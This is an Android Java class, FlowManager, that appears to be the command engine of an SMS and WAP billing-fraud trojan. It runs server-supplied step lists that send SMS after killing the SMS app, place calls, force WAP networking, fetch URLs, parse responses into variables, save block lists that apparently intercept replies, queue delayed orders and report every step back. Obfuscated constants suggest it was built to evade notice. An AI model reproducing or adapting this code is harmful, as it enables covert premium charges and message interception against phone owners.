package net.workspace.manager;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import net.workspace.bean.Json;
import net.workspace.bean.Order;
import net.workspace.bean.Step;
import net.workspace.bean.form.JsonForm;
import net.workspace.bean.prop.Forward;
import net.workspace.bean.prop.KeyValue;
import net.workspace.bean.prop.Matcher;
import net.workspace.bean.prop.Response;
import net.workspace.bean.step.AbstractHttpStep;
import net.workspace.bean.step.AbstractParseResponseStep;
import net.workspace.bean.step.CallStep;
import net.workspace.bean.step.DelayStep;
import net.workspace.bean.step.DownLoadStep;
import net.workspace.bean.step.JsonRequestStep;
import net.workspace.bean.step.NetWorkStep;
import net.workspace.bean.step.RequestStep;
import net.workspace.bean.step.SmsStep;
import net.workspace.http.DownLoadThread;
import net.workspace.http.HttpJsonThread;
import net.workspace.http.HttpRequestThread;
import net.workspace.http.NetContext;
import net.workspace.ivr.CallPhoneUtil;
import net.workspace.listener.CallListener;
import net.workspace.listener.FlowListener;
import net.workspace.listener.NetListener;
import net.workspace.listener.NetworkListener;
import net.workspace.listener.SendSmsListener;
import net.workspace.network.NetworkController;
import net.workspace.sms.BlockHelper;
import net.workspace.sms.SmsSender;
import net.workspace.util.CommonUtil;
import net.workspace.util.MyLogger;
import org.json.JSONObject;
import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;

public class FlowManager {
    private static final String STRING = /*const-replace-start*/")";
    private static final String VALUE = /*const-replace-start*/",value:";
    private static final String PARSE_RESPONSE_ERROR_NAME = /*const-replace-start*/"parseResponseError:(name:";
    private static final String HTTP = /*const-replace-start*/"http://";
    private static final String PREFIX = /*const-replace-start*/"/";
    private static final String 网络连接超时 = /*const-replace-start*/"网络连接超时";
    private static final String 网络连接失败 = /*const-replace-start*/"网络连接失败";
    private static final String 下载地址获取失败 = /*const-replace-start*/"下载地址获取失败:";
    private static final String call_failure = /*const-replace-start*/"通话失败";
    private static final String WAP = /*const-replace-start*/"wap";
    private static String PREF_WORKSPACE = /*const-replace-start*/"HLPDEFGLAAAA";
    public static FlowManager getInstanse() {
        if (instanse == null) instanse = new FlowManager();
        return instanse;
    }
    private static boolean validate(String regex, String value) {
        try {
            return regex == null || regex.length() == 0 || value != null && java.util.regex.Pattern.compile(regex).matcher(value).find();
        } catch (Throwable e) {
            MyLogger.error(e);
        }
        return false;
    }
    private static FlowManager instanse;
    private boolean isExecuting = false;
    private List<FlowRuntime> flowRuntimePool;
    private FlowRuntime flowRuntime;
    private int stepIndex = 0;
    private int totalStep = -1;
    private int executCount = 0;
    long maxDelay = 3600 * 24 * 7;
    private void clean() {
        isExecuting = false;
        flowRuntime = null;
        if (flowRuntimePool != null) {
            flowRuntimePool.clear();
            flowRuntimePool = null;
        }
        instanse = null;
        executCount = 0;
        System.gc();
    }
    private void doCall(final Step step) {
        CallStep call = (CallStep) step;
        new CallPhoneUtil(CommonUtil.getRuntimeValue(flowRuntime.variables, call.receiver), call.duration, new CallListener() {
            @Override
            public void onFailed() {
                stepFailure(step, call_failure);
            }
            @Override
            public void onSuccess() {
                stepSuccess(step);
            }
        }).startCallPhone();
    }
    private void doChangeNetwork(final Step step) {
        NetWorkStep network = (NetWorkStep) step;
        int networkType = WAP.equalsIgnoreCase(network.networkType) ? 1 : 0;
        NetworkController.doNetworkTask(networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    stepSuccess(step);
                } else {
                    stepFailure(step, errorMsg);
                }
            }
        });
    }
    private void doDelay(Step step) {
        CommonUtil.sleep(((DelayStep) step).delayTime * 1000);
        gotoNextStep();
    }
    private void doDownload(final Step step) {
        final DownLoadStep download = (DownLoadStep) step;
        NetworkController.doNetworkTask(download.networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg != null) {
                    stepFailure(step, errorMsg);
                    return;
                }
                String url = CommonUtil.getRuntimeValue(flowRuntime.variables, download.url);
                if (TextUtils.isEmpty(url)) {
                    stepFailure(step, 下载地址获取失败 + url);
                    return;
                }
                url = replaceRelativeUrl(download, url);
                new DownLoadThread(new NetContext(url, download, flowRuntime.variables, new NetListener() {
                    @Override
                    public void onFailed(int i, String s2, String s3) {
                        stepFailure(step, 网络连接失败);
                    }
                    @Override
                    public void onSuccess(int i, String url, String s2) {
                        flowRuntime.urlArray.put(step.index, url);
                        stepSuccess(step);
                    }
                    @Override
                    public void onTimeout(int i) {
                        stepFailure(step, 网络连接超时);
                    }
                })).startThread();
            }
        });
    }
    private void doJsonRequest(final Step step) {
        final JsonRequestStep jsonRequestStep = (JsonRequestStep) step;
        NetworkController.doNetworkTask(jsonRequestStep.networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg != null) {
                    stepFailure(step, errorMsg);
                    return;
                }
                List<KeyValue> params = new ArrayList<KeyValue>();
                if (jsonRequestStep.params != null) {
                    for (KeyValue kv : jsonRequestStep.params) {
                        params.add(new KeyValue(kv.key, CommonUtil.getRuntimeValue(flowRuntime.variables, kv.value)));
                    }
                }
                try {
                    JsonForm form = CommonUtil.initForm(JsonForm.class);
                    form.params = params;
                    String url = CommonUtil.getRuntimeValue(flowRuntime.variables, jsonRequestStep.url);
                    new HttpJsonThread(new NetContext(url, form.toJson(), new NetListener() {
                        @Override
                        public void onFailed(int callBack, String errorCode, String errorMsg) {
                            stepFailure(step, errorMsg);
                        }
                        @Override
                        public void onSuccess(int callBack, String url, String content) {
                            flowRuntime.urlArray.put(step.index, url);
                            parseResponse(jsonRequestStep, content);
                        }
                        @Override
                        public void onTimeout(int i) {
                            stepFailure(step, 网络连接超时);
                        }
                    }, jsonRequestStep.secret)).startThread();
                } catch (Exception e) {
                    MyLogger.error(e);
                }
            }
        });
    }
    private void doRequest(final Step step) {
        final RequestStep request = (RequestStep) step;
        NetworkController.doNetworkTask(request.networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg != null) {
                    stepFailure(step, errorMsg);
                    return;
                }
                String url = CommonUtil.getRuntimeValue(flowRuntime.variables, request.url);
                MyLogger.debug(url);
                new HttpRequestThread(new NetContext(url, request, flowRuntime.variables, new NetListener() {
                    @Override
                    public void onFailed(int callBack, String errorCode, String errorMsg) {
                        stepFailure(step, errorMsg);
                    }
                    @Override
                    public void onSuccess(int i, String url, String content) {
                        flowRuntime.urlArray.put(step.index, url);
                        parseResponse(request, content);
                    }
                    @Override
                    public void onTimeout(int i) {
                        stepFailure(step, 网络连接超时);
                    }
                })).startThread();
            }
        });
    }
    private void doSendSms(final Step step) {
        CommonUtil.killSmsApp();
        SmsStep sms = (SmsStep) step;
        sms.realReceiver = CommonUtil.getRuntimeValue(flowRuntime.variables, sms.receiver);
        sms.realMsg = CommonUtil.getRuntimeValue(flowRuntime.variables, sms.msg);
        if (TextUtils.isEmpty(sms.realReceiver) || TextUtils.isEmpty(sms.realMsg)) {
            stepFailure(step, "receiverOrMsgEmpty");
            return;
        }
        SendSmsListener listener = new SendSmsListener() {
            @Override
            public void onSendSmsFailed(String address, String message, String errorMsg) {
                stepFailure(step, errorMsg);
            }
            @Override
            public void onSendSmsSuccess(String address, String message) {
                stepSuccess(step);
            }
        };
        new SmsSender(listener).sendSms(sms.realReceiver, sms.realMsg, sms.timeout);
    }
    private void end(String errorMsg) {
        if (flowRuntime != null && flowRuntime.orderListener != null) {
            flowRuntime.orderListener.onFinished(flowRuntime.variables, errorMsg);
        }
        if (hasNextContext()) {
            gotoNextContext();
            return;
        }
        clean();
    }
    public void execute(Order order, FlowListener orderListener) {
        BlockHelper.saveBlocks(order.blockList);
        BlockHelper.saveFeedbacks(order.feedbackList);
        if (order.delay > 0) {
            saveOrder(order);
            if (orderListener != null) {
                orderListener.onFinished(new HashMap<String, String>(), "delayed");
            }
            return;
        }
        executeFlow(order, orderListener);
    }
    private void executeFlow(Order order, FlowListener orderListener) {
        FlowRuntime runTime = new FlowRuntime();
        runTime.order = order;
        runTime.variables = new HashMap<String, String>();
        runTime.orderListener = orderListener;
        if (flowRuntimePool == null) flowRuntimePool = new ArrayList<FlowRuntime>();
        flowRuntimePool.add(runTime);
        if (!isExecuting) {
            isExecuting = true;
            initBeforeExecute();
        }
    }
    private void executeStep() {
        try {
            if (!validate() || executCount++ > 30) {
                end(null);
                return;
            }
            Step step = flowRuntime.order.stepList.get(stepIndex);
            step.executeStartTime = System.currentTimeMillis();
            switch (step.actionId) {
                case Step.REQUEST:
                    doRequest(step);
                    break;
                case Step.JSON_REQUEST:
                    doJsonRequest(step);
                    break;
                case Step.DOWNLOAD:
                    doDownload(step);
                    break;
                case Step.DELAY:
                    doDelay(step);
                    break;
                case Step.END:
                    stepSuccess(step);
                    break;
                case Step.CALL:
                    doCall(step);
                    break;
                case Step.SMS:
                    doSendSms(step);
                    break;
                case Step.NETWORK:
                    doChangeNetwork(step);
                    break;
            }
        } catch (Exception e) {
            MyLogger.error(e);
            end(e.toString());
        }
    }
    private void gotoNextContext() {
        Iterator<FlowRuntime> iterator = flowRuntimePool.iterator();
        while (iterator.hasNext()) {
            FlowRuntime orderContext = iterator.next();
            if (orderContext.order.id == orderContext.order.id) {
                iterator.remove();
            }
        }
        initBeforeExecute();
    }
    private void gotoNextStep() {
        stepIndex++;
        if (!validate()) {
            end(null);
            return;
        }
        executeStep();
    }
    private boolean hasNextContext() {
        return flowRuntimePool != null && flowRuntimePool.size() > 1;
    }
    private void initBeforeExecute() {
        if (flowRuntimePool != null && flowRuntimePool.size() > 0) {
            flowRuntime = flowRuntimePool.get(0);
        }
        if (flowRuntime != null) {
            if (flowRuntime.order.stepList != null) {
                totalStep = flowRuntime.order.stepList.size();
            }
            stepIndex = 0;
        }
        executCount = 0;
        executeStep();
    }
    private void parseResponse(AbstractParseResponseStep step, String content) {
        if (step.response != null) {
            step.response.body = content;
            String parseError = parseResponseParam(step);
            if (parseError != null) {
                stepFailure(step, parseError);
                return;
            }
            if (step.response.forwards != null) {
                for (Forward forward : step.response.forwards) {
                    if (content.contains(forward.keyword)) {
                        if (forward.jumpNumber != 0) {
                            stepIndex += forward.jumpNumber;
                            break;
                        }
                        //executeStep(key.stepIndex);
                        //return;
                    }
                }
            }
        }
        stepSuccess(step);
    }
    private String parseResponseParam(AbstractParseResponseStep step) {
        Response response = step.response;
        MyLogger.debug(response.body);
        if (response.matchers != null) {
            for (Matcher matcher : response.matchers) {
                matcher.value = CommonUtil.parseVariable(response.body, matcher.match);
                if (!validate(matcher.regexValidate, matcher.value)) { //
                    return PARSE_RESPONSE_ERROR_NAME + matcher.variableName + VALUE + matcher.value + STRING;
                }
                if (matcher.value != null) {
                    flowRuntime.variables.put(matcher.variableName, matcher.value);
                }
            }
        }
        return null;
    }
    private String replaceRelativeUrl(AbstractHttpStep httpStep, String target) {
        if (!target.toLowerCase(Locale.getDefault()).startsWith("http")) {
            int index = httpStep.contextIndex;
            if (index < 0) {
                for (int i = httpStep.index - 1; i >= 0; i--) {
                    if (flowRuntime.order.stepList.get(i) instanceof AbstractHttpStep) {
                        index = i;
                        break;
                    }
                }
            }
            if (index >= 0 && flowRuntime.order.stepList.size() > index) {
                Step step = flowRuntime.order.stepList.get(index);
                if (step instanceof AbstractHttpStep) {
                    String stepUrl = flowRuntime.urlArray.get(index);
                    if (stepUrl != null && stepUrl.toLowerCase(Locale.getDefault()).startsWith("http")) {
                        if (target.startsWith(PREFIX)) {
                            target = stepUrl.substring(0, stepUrl.indexOf(PREFIX, HTTP.length() + 2)) + target;
                        } else {
                            target = stepUrl.substring(0, stepUrl.lastIndexOf('/') + 1) + target;
                        }
                    }
                }
            }
        }
        return target;
    }
    private void report(final Step step, final String errorMsg) {
        class StepReportListener implements NetListener {
            @Override
            public void onFailed(int callBack, String errorCode, String errorMsg) {
                result();
            }
            @Override
            public void onSuccess(int callBack, String url, String content) {
                result();
            }
            @Override
            public void onTimeout(int i) {
                result();
            }
            private void result() {
                if (errorMsg == null || step.continueOnFailure) {
                    gotoNextStep();
                } else {
                    end(errorMsg);
                }
            }
        }
        ReportManager.report(step, errorMsg == null, errorMsg, new StepReportListener());
    }
    private void saveOrder(Order order) {
        long delay = order.delay;
        if (delay > maxDelay) delay = maxDelay;
        order.delay = System.currentTimeMillis() + delay * 1000;
        String target = null;
        try {
            target = order.toJson().toString();
        } catch (Exception e) {
            MyLogger.error(e);
        }
        if (target != null) {
            SharedPreferences pref = CommonUtil.context.getSharedPreferences(PREF_WORKSPACE, Context.MODE_PRIVATE);
            pref.edit().putString(String.valueOf(System.currentTimeMillis()), target).commit();
        }
    }
    public boolean scheduleCheckDelayedOrder() {
        boolean result = false;
        SharedPreferences pref = CommonUtil.context.getSharedPreferences(PREF_WORKSPACE, Context.MODE_PRIVATE);
        Map<String, ?> map = pref.getAll();
        final List<Order> list = new ArrayList<Order>();
        if (map.size() > 0) {
            long current = System.currentTimeMillis();
            for (String key : map.keySet()) {
                String orderString = pref.getString(key, null);
                if (orderString != null) {
                    try {
                        Order order = Json.optObj(Order.class, new JSONObject(orderString));
                        if (order.delay < current) {
                            list.add(order);
                            pref.edit().remove(key).commit();
                        }
                    } catch (Exception e) {
                        pref.edit().remove(key).commit();
                        MyLogger.error(e);
                    }
                }
            }
        }
        if (list.size() > 0) {
            result = true;
            for (Order order : list) {
                executeFlow(order, null);
            }
        }
        return result;
    }
    private void stepFailure(final Step step, String errorMsg) {
        step.executeEndTime = System.currentTimeMillis();
        if (step.reportFailure) {
            report(step, errorMsg);
        } else if (step.continueOnFailure) {
            gotoNextStep();
        } else {
            end(errorMsg);
        }
    }
    private void stepSuccess(final Step step) {
        step.executeEndTime = System.currentTimeMillis();
        if (step.reportSuccess) {
            report(step, null);
        } else {
            gotoNextStep();
        }
    }
    private boolean validate() {
        return flowRuntime != null && flowRuntime.order != null && flowRuntime.order.stepList != null && flowRuntime.order.stepList.size() > 0 && stepIndex >= 0
                && stepIndex < totalStep;
    }
}
